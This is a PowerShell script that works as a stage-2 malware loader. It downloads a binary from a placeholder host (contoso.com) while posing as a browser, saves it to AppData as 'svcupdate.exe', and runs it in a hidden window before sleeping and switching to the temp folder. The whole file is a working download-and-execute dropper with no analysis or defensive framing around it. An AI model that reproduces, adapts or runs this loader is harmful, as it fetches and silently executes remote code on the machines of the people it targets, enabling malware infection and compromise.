[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://contoso.com/stage2.bin",
    [string]$Stage2Path = "$env:APPDATA\svcupdate.exe",
    [int]$ConnectionTimeout = 202,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-Stage2Download -SourceUrl $DownloadUrl -DestinationPath $Stage2Path -TimeoutSec $ConnectionTimeout -UserAgent $BrowserAgent
if ($StageResult) {
    Start-Process -FilePath $Stage2Path -WindowStyle Hidden -ErrorAction SilentlyContinue
}

Start-Sleep -Seconds 21
Set-Location -Path $env:TEMP
